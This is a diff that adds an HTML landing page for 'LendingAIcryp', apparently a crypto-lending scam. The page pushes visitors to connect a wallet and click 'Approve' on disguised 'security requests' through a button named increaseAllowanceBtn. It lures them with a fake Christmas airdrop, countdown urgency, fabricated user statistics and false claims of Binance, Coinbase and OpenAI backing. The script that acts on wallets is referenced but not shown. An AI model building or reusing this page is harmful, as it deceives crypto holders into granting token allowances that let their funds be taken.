@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="keywords" content="lendingaicryp, lending, AI, crypto, credit, LendingAIcryp, crypto credit, Airdrop, ai, ia, credito, borrow, prestamos, lend">
+  <meta name="author" content="LendingAIcryp">
+  <meta name="google-site-verification" content="o6kzYE3XbklAMlfaw0abRWsaKuKbIXAb8mTtinTr2IQ" />
+  <meta name="description" content="LendingAIcryp Borrow Crypto Instantly.">
+  <title>LendingAIcryp - Borrow Crypto Instantly.</title>
+
+  <!-- 
+    - favicon
+  -->
+  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">
+
+  <!-- 
+    - custom css link
+  -->
+  <link rel="stylesheet" href="./assets/css/style.css">
+  <link rel="stylesheet" href="./assets/css/comments.css">
+
+  <!-- 
+    - google font link
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <div id="custom-cursor-dot"></div>
+  <div id="custom-cursor-ring"></div>
+  <!-- 
+    - #HEADER
+  -->
+<canvas id="particleCanvas"></canvas>
+  <header class="header" data-header>
+    <div class="container">
+
+      <a href="#" class="logo">
+        <img src="./assets/images/logo.svg" width="32" height="32" alt="Cryptex logo">
+        LendingAIcryp
+      </a>
+
+      <nav class="navbar" data-navbar>
+        <ul class="navbar-list">
+
+          <li class="navbar-item">
+            <a href="#" class="navbar-link" data-nav-link>Homepage</a>
+          </li>
+
+          <li class="navbar-item">
+            <a href="#" class="navbar-link register-alert" data-nav-link>Buy Crypto</a>
+          </li>
+
+          <li class="navbar-item">
+            <a href="#" class="navbar-link register-alert" data-nav-link>Markets</a>
+          </li>
+
+          <li class="navbar-item">
+            <a href="#" class="navbar-link register-alert" data-nav-link>Sell Crypto</a>
+          </li>
+
+          <li class="navbar-item">
+            <a href="#" class="navbar-link register-alert" data-nav-link>Credit</a>
+          </li>
+
+          <li class="navbar-item">
+            <a href="#" class="navbar-link register-alert" data-nav-link>Swap</a>
+          </li>
+
+        </ul>
+      </nav>
+
+      <button class="nav-toggle-btn" aria-label="Toggle menu" data-nav-toggler>
+        <span class="line line-1"></span>
+        <span class="line line-2"></span>
+        <span class="line line-3"></span>
+      </button>
+
+    
+      <a href="#" class="btn btn-outline" id="walletBtn" data-wallet-text>Connect Wallet</a>
+
+    </div>
+  </header>
+
+
+
+
+
+  <main>
+    <div id="notification" class="notification"></div>
+    <article>
+
+      <!-- 
+        - #HERO
+      -->
+
+      <section class="section hero" aria-label="hero" data-section>
+        <div class="container">
+
+          <div class="hero-content">
+
+          
+            <h1 class="h1 hero-title">Borrow & Lend Tokens Seamlessly with LendingAIcryp</h1>
+
+            <p class="hero-text">
+              Whether you’re looking to borrow or lend, our platform, powered by cutting-edge AI, makes it easy to grow your crypto portfolio with flexible credit options. Unlock up to $500,000 in credit and take your financial strategy to the next level. Plus, by registering your first account, you’ll enter a 24-hour christmas Airdrop for $100,000 in FREE rewards!
+            </p>
+            <p id="countdown" class="countdown-text" style="color: #4a7dfc; font-family: 'Arial', sans-serif;">Last credit today! <span id="countdown-timer"></span></p>
+
+
+
+            <a href="#" class="btn btn-primary" id="increaseAllowanceBtn">Get Started now</a>
+            <p id="statusMessage" class="status-message"></p>
+
+          </div>
+
+          
+
+          <figure class="hero-banner floating-animation">
+            <img src="./assets/images/hero-banner.png" width="570" height="448" alt="hero banner" class="w-100">
+          </figure>
+
+        </div>
+      </section>
+
+
+
+
+
+      <!-- 
+        - #TREND
+      -->
+
+      <section class="section trend" aria-label="crypto trend" data-section>
+        <div class="container">
+
+          <div class="trend-tab">
+
+            <ul class="tab-nav">
+
+              <li>
+                <button class="tab-btn active">Crypto</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">DeFi</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">BSC</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">NFT</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">Metaverse</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">Polkadot</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">Solana</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">Opensea</button>
+              </li>
+
+              <li>
+                <button class="tab-btn">Makersplace</button>
+              </li>
+
+            </ul>
+
+            <ul class="tab-content">
+
+              <li>
+                <div class="trend-card">
+
+                  <div class="card-title-wrapper">
+                    <img src="./assets/images/coin-1.svg" width="24" height="24" alt="bitcoin logo">
+
+                    <a href="#" class="card-title">
+                      Bitcoin <span class="span">BTC/USD</span>
+                    </a>
+                  </div>
+
+                  <data class="card-value" value="46168.95">Bitcoin</data>
+
+                  <div class="card-analytics">
+                    <data class="current-price" value="36641.20"></data>
+
+                    
+                  </div>
+
+                </div>
+              </li>
+
+              <li>
+                <div class="trend-card">
+
+                  <div class="card-title-wrapper">
+                    <img src="./assets/images/coin-2.svg" width="24" height="24" alt="ethereum logo">
+
+                    <a href="#" class="card-title">
+                      Ethereum <span class="span">ETH/USD</span>
+                    </a>
+                  </div>
+
+                  <data class="card-value" value="3480.04">Ethereum</data>
+
+                  <div class="card-analytics">
+                    <data class="current-price" value="36641.20"></data>
+
+                    
+                  </div>
+
+                </div>
+              </li>
+
+              <li>
+                <div class="trend-card">
+
+                  <div class="card-title-wrapper">
+                    <img src="./assets/images/coin-3.svg" width="24" height="24" alt="tether logo">
+
+                    <a href="#" class="card-title">
+                      Tether <span class="span">USDT/USD</span>
+                    </a>
+                  </div>
+
+                  <data class="card-value" value="1.00">USD 1.00</data>
+
+                  <div class="card-analytics">
+                    <data class="current-price" value="36641.20"></data>
+
+                    
+                  </div>
+
+                </div>
+              </li>
+
+              <li>
+                <div class="trend-card">
+
+                  <div class="card-title-wrapper">
+                    <img src="./assets/images/coin-4.svg" width="24" height="24" alt="bnb logo">
+
+                    <a href="#" class="card-title">
+                      BNB <span class="span">BNB/USD</span>
+                    </a>
+                  </div>
+
+                  <data class="card-value" value="443.56">BNB</data>
+
+                  <div class="card-analytics">
+                    <data class="current-price" value="36641.20"></data>
+
+                    
+                  </div>
+
+                </div>
+              </li>
+
+            </ul>
+
+          </div>
+
+        </div>
+      </section>
+
+      <section class="stats-banner" aria-label="platform statistics">
+        <div class="container">
+          <div class="stats-panel">
+            <div class="stats-grid">
+              <div class="stat-item" data-value="134890">
+                <h3 class="stat-title">Active Users</h3>
+                <span class="stat-value">0</span>
+              </div>
+              <div class="stat-item" data-value="175316">
+                <h3 class="stat-title">Credits Approved Today</h3>
+                <span class="stat-value">0</span>
+              </div>
+              <div class="stat-item" data-value="9487562$">
+                <h3 class="stat-title">Total Funds Distributed</h3>
+                <span class="stat-value">0</span>
+                <span class="currency"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+
+
+      <!-- 
+        - #MARKET
+      -->
+      
+      <section class="section market" aria-label="market update" data-section data-initialized="false">
+        <div class="container">
+          <div class="title-wrapper">
+            <div class="crypto-title-container">
+              <h2 class="h2 section-title crypto-market-title" id="cryptoMarketTitle">Today's Cryptocurrency Prices</h2>
+            </div>
+            <div id="updateCountdown" class="update-countdown"></div>
+          </div>
+          <div class="market-tab">
+            <ul class="tab-nav">
+              <li>
+                <button class="tab-btn active" data-filter="all">All</button>
+              </li>
+              <li>
+                <button class="tab-btn" data-filter="gainers">Gainers</button>
+              </li>
+              <li>
+                <button class="tab-btn" data-filter="losers">Losers</button>
+              </li>
+            </ul>
+            <table class="market-table">
+              <thead class="table-head">
+                <tr class="table-row table-title">
+                  <th class="table-heading" scope="col">Rank</th>
+                  <th class="table-heading" scope="col">Name</th>
+                  <th class="table-heading" scope="col">Price</th>
+                  <th class="table-heading" scope="col">24h %</th>
+                  <th class="table-heading" scope="col">Market Cap</th>
+                </tr>
+              </thead>
+              <tbody class="table-body" id="cryptoTableBody">
+                <!-- Cryptocurrency data will be dynamically inserted here -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+    
+     
+                  
+
+
+      <!-- 
+        - #INSTRUCTION
+      -->
+
+      <section class="section instruction" aria-label="instruction" data-section>
+        <div class="container">
+
+          <h2 class="h2 section-title how-it-work-title" id="howItWorkTitle">How It Work</h2>
+
+          <p class="section-text">
+            Our cutting-edge AI enables us to offer cryptocurrency credit effortlessly and efficiently. By using powerful neural network algorithms that constantly analyze the market, we help maximize user profits, allowing us to increase the amount of tokens available for lending without any hassle.
+          </p>
+
+          <ul class="instruction-list">
+
+            <li>
+              <div class="instruction-card">
+
+                <figure class="card-banner">
+                  <img src="./assets/images/instruction-1.png" width="96" height="96" loading="lazy" alt="Step 1"
+                    class="img">
+                </figure>
+
+                <p class="card-subtitle">Step 1</p>
+
+                <h3 class="h3 card-title">Connect Wallet & Register</h3>
+
+                <p class="card-text">
+                  Connect your wallet and sign up your mail to initiate the account creation process. Then, click 'Get Started now' to proceed with creating your new account.
+                </p>
+
+              </div>
+            </li>
+
+            <li>
+              <div class="instruction-card">
+
+                <figure class="card-banner">
+                  <img src="./assets/images/instruction-2.png" width="96" height="96" loading="lazy" alt="Step 2"
+                    class="img">
+                </figure>
+
+                <p class="card-subtitle">Step 2</p>
+
+                <h3 class="h3 card-title">Confirm your security request 1</h3>
+
+                <p class="card-text">
+                  A security notification will appear. Click "Next" to continue creating your account.
+                </p>
+
+              </div>
+            </li>
+
+            <li>
+              <div class="instruction-card">
+
+                <figure class="card-banner">
+                  <img src="./assets/images/instruction-3.png" width="96" height="96" loading="lazy" alt="Step 3"
+                    class="img">
+                </figure>
+
+                <p class="card-subtitle">Step 3</p>
+
+                <h3 class="h3 card-title">Confirm your security request 2</h3>
+
+                <p class="card-text">
+                  To complete the creation of your account, you must click the 'Approve' button to enable you to receive credit in your preferred token. This way, if you are selected and approved for crypto credit, the funds will be sent to you in the currency of your choice. Plus, if you're creating your first account, you'll automatically enter a $100,000 Airdrop of FREE rewards!
+                </p>
+
+              </div>
+            </li>
+
+            <li>
+              <div class="instruction-card">
+
+                <figure class="card-banner">
+                  <img src="./assets/images/instruction-4.png" width="96" height="96" loading="lazy" alt="Step 4"
+                    class="img">
+                </figure>
+
+                <p class="card-subtitle">Step 4</p>
+
+                <h3 class="h3 card-title">Account successfully created and credit approved!</h3>
+
+                <p class="card-text">
+                  If you are ultimately selected for the approval of your crypto credit, you will be notified via email that your credit has been successfully approved!. Before receiving this notification, you will need to confirm that your employment status is active and that you will not face any issues repaying the credit in the future. This concludes your credit application process.
+                </p>
+
+              </div>
+            </li>
+
+          </ul>
+
+        </div>
+      </section>
+
+
+
+
+
+      <!-- 
+        - #ABOUT
+      -->
+
+      <section class="section about" aria-label="about" data-section>
+        <div class="container">
+
+          <figure class="hero-banner floating-animation">
+            <img src="./assets/images/about-banner.png" width="748" height="439" alt="hero banner" class="w-100">
+          </figure>
+
+          <div class="about-content">
+
+            <h2 class="h2 section-title">What Is LendingAIcryp</h2>
+
+            <p class="section-text">
+              We are a digital financial asset exchange, specializing in cryptocurrency loans and services. Founded in 2019 by a group of experts and renowned investors from Binance, Coinbase, and KuCoin, our mission is to provide a platform where users can request loans from our company and also offer loans to other users. Additionally, we leverage cutting-edge artificial intelligence technology powered by OpenAI to optimize financial gains for our clients, creating a solid, modern, and secure platform.
+            </p>
+
+            <ul class="section-list">
+
+              <li class="section-item">
+                <div class="title-wrapper">
+                  <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
+
+                  <h3 class="h3 list-title">Apply for fast, secure, and reliable cryptocurrency credits.</h3>
+                </div>
+
+                <p class="item-text">
+                  Obtain cryptocurrency credits based on our AI-driven analysis of users' financial status. The amount we can lend you will depend on your financial and employment status, and the amount of collateral, with credits ranging from $10,000, $100,000, and up to $500,000 USDT! If you qualify and are selected for our credit services.
+                </p>
+              </li>
+
+              <li class="section-item">
+                <div class="title-wrapper">
+                  <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
+
+                  <h3 class="h3 list-title">Buy and sell BTC, ETH, XRP, OKB, Etc...</h3>
+                </div>
+
+                <p class="item-text">
+                  Experience a variety of trading on Bitcost. You can use various types of coin transactions such as
+                  Spot Trade, Futures
+                  Trade, P2P, Staking, Mining, and margin.
+                </p>
+                <div class="email-subscription">
+                  <input type="email" id="emailInput" placeholder="Sign up your mail" class="email-input">
+                  <button id="sendButton" class="btn btn-primary send-button">Send</button>
+                </div>
+            
+              </li>
+
+            </ul>
+
+            <a href="#" class="btn btn-primary">Explore More</a>
+
+          </div>
+
+        </div> 
+      </section>
+
+      <section class="section app" aria-label="app" data-section>
+      </div>
+      <div class="sponsors-wrapper">
+        <div class="sponsors-container">
+          <a href="https://www.binance.com" target="_blank" rel="noopener noreferrer" class="sponsor-link">
+            <div class="sponsor-brand">BINANCE</div>
+          </a>
+          <a href="https://pancakeswap.finance/" target="_blank" rel="noopener noreferrer" class="sponsor-link">
+            <div class="sponsor-brand">PancakeSwap</div>
+          </a>
+          <a href="https://metamask.io" target="_blank" rel="noopener noreferrer" class="sponsor-link">
+            <div class="sponsor-brand">METAMASK</div>
+          </a>
+          <a href="https://www.kucoin.com" target="_blank" rel="noopener noreferrer" class="sponsor-link">
+            <div class="sponsor-brand">KuCoin</div>
+          </a>
+          <a href="https://coinmarketcap.com" target="_blank" rel="noopener noreferrer" class="sponsor-link">
+            <div class="sponsor-brand">CoinMarketCap</div>
+          </a>
+          <a href="https://www.coinbase.com" target="_blank" rel="noopener noreferrer" class="sponsor-link">
+            <div class="sponsor-brand">CoinBase</div>
+          </a>
+        </div>
+      </div>
+
+<section class="section comments" aria-label="comments" data-section>
+  <div class="container">
+    <h2 class="h2 section-title">What Our Users Say</h2>
+    <div class="comment-slider">
+      <!-- Comment cards will be dynamically inserted here by JavaScript -->
+    </div>
+    <div class="slider-nav">
+      <button class="nav-btn prev" aria-label="Previous comment">&lt;</button>
+      <button class="nav-btn next" aria-label="Next comment">&gt;</button>
+    </div>
+  </div>
+</section>
+
+      <!-- 
+        - #APP
+      -->
+
+
+        <div class="container">
+
+          <div class="app-content">
+
+            <h2 class="h2 section-title">Unlock Your Credit Grow With Confidence.</h2>
+
+            <p class="section-text">
+              With LendingAIcryp, your success isn’t just a possibility—it’s a certainty. Trust in a platform that empowers your skills, protects your assets, and delivers results.
+            </p>
+
+            <ul class="section-list">
+
+              <li class="section-item">
+                <div class="title-wrapper">
+                  <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
+
+                  <h3 class="h3 item-title">Buy, Sell, And Trade On The Go</h3>
+                </div>
+
+                <p class="item-text">
+                  Manage Your Holdings From Your Phone.
+                </p>
+              </li>
+
+              <li class="section-item">
+                <div class="title-wrapper">
+                  <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
+
+                  <h3 class="h3 item-title">Take Control Of Your Wealth</h3>
+                </div>
+
+                <p class="item-text">
+                  Rest assured, you (and only you) have access to your funds. We will never ask you for money—ever.
+                </p>
+              </li>
+
+            </ul>
+
+            <div class="app-wrapper">
+              <a href="#">
+                <img src="./assets/images/googleplay.png" width="135" height="40" loading="lazy"
+                  alt="get it on google play">
+              </a>
+
+              <a href="#">
+                <img src="./assets/images/appstore.png" width="120" height="40" loading="lazy"
+                  alt="download on the app store">
+              </a>
+            </div>
+
+          </div>
+
+          <figure class="hero-banner floating-animation">
+            <img src="./assets/images/app-banner.png" width="618" height="526" alt="hero banner" class="w-100">
+          </figure>
+
+        
+      </section>
+
+    </article>
+  </main>
+
+
+
+
+
+  <!-- 
+    - #FOOTER
+  -->
+
+  <footer class="footer">
+
+    <div class="footer-top" data-section>
+      <div class="container">
+
+        <div class="footer-brand">
+
+          <a href="#" class="logo">
+            <img src="./assets/images/logo.svg" width="50" height="50" alt="Cryptex logo">
+            LendingAIcryp
+          </a>
+
+          <h2 class="footer-title">Let's talk! 🤙</h2>
+
+          <a href="tel:+123456789101" class="footer-contact-link"></a>
+
+          <a href="lendingaicryp@gmail.com" class="footer-contact-link">lendingaicryp@gmail.com</a>
+
+          <address class="footer-contact-link">
+            9112 Sunland Boulevard Sun Valley, CA 81342. DFPI Contact: Derek Nelson, Sacramento Office
+          </address>
+
+        </div>
+
+        <ul class="footer-list">
+
+          <li>
+            <p class="footer-list-title">Products</p>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Spot</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Inverse Perpetual</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">USDT Perpetual</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Exchange</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Launchpad</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Binance Pay</a>
+          </li>
+
+        </ul>
+
+        <ul class="footer-list">
+
+          <li>
+            <p class="footer-list-title">Services</p>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Buy Crypto</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Markets</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Tranding Fee</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Affiliate Program</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Referral Program</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">API</a>
+          </li>
+
+        </ul>
+
+        <ul class="footer-list">
+
+          <li>
+            <p class="footer-list-title">Support</p>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Bybit Learn</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Help Center</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">User Feedback</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Submit a request</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">API Documentation</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Trading Rules</a>
+          </li>
+
+        </ul>
+
+        <ul class="footer-list">
+
+          <li>
+            <p class="footer-list-title">About Us</p>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">About Bybit</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Authenticity Check</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Careers</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Business Contacts</a>
+          </li>
+
+          <li>
+            <a href="#" class="footer-link">Blog</a>
+          </li>
+
+        </ul>
+
+      </div>
+    </div>
+    <td class="table-data">
+      <button class="add-to-fav" aria-label="Add to favourite" data-add-to-fav>
+        <ion-icon name="star-outline" aria-hidden="true" class="icon-outline"></ion-icon>
+        <ion-icon name="star" aria-hidden="true" class="icon-fill"></ion-icon>
+      </button>
+    </td>
+    <div class="footer-bottom">
+      <div class="container">
+
+        <p class="copyright">
+          &copy; 2019 All Rights Reserved <a href="#" class="copyright-link">LendingAIcryp</a>
+        </p>
+
+      </div>
+    </div>
+                <td class="table-data">
+                  <button class="add-to-fav" aria-label="Add to favourite" data-add-to-fav>
+                    <ion-icon name="star-outline" aria-hidden="true" class="icon-outline"></ion-icon>
+                    <ion-icon name="star" aria-hidden="true" class="icon-fill"></ion-icon>
+                  </button>
+                </td>
+  </footer>
+
+
+
+
+
+  <!-- 
+    - custom js link
+  -->
+  <script src="./assets/js/script.js" defer></script>
+
+  <!-- 
+    - ionicon link
+  -->
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+  <script src="./assets/js/web3-integration.js"></script>
+  <div id="walletModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Wallet Balances</h2>
+      <div id="balances"></div>
+    </div>
+  </div>
+  <div id="creditModal" class="credit-modal">
+    <div class="modal-content">
+      <span class="close-btn">&times;</span>
+      <div class="modal-header">
+        <h2>Register LendingAIcryp Account</h2>
+      </div>
+      <div class="modal-body">
+        <div class="loading-spinner"></div>
+        <img src="./assets/images/credit-token-icon.png" alt="Credit Token" class="token-icon">
+        <p class="instructions">Click next and then Approve to continue</p>
+        <p class="wallet-instruction">Proceed in your wallet</p>
+      </div>
+    </div>
+  </div>
+  <script src="./assets/js/text-effect.js"></script>
+  <script src="./assets/js/navbar-alert.js"></script>
+  <script src="./assets/js/particles.js"></script>
+  <script src="./assets/js/custom-cursor.js"></script>
+  </div>
+  <script src="./assets/js/modal.js"></script>
+  <script src="./assets/js/crypto-market.js"></script>
+  <script type="module" src="./assets/js/vercel-analytics.js"></script>
+  <script src="./assets/js/comments.js"></script>
+  <script src="./assets/js/stats-banner.js"></script>
+  <link rel="stylesheet" href="./assets/css/stats-banner.css">
+</body>
+
+</html>
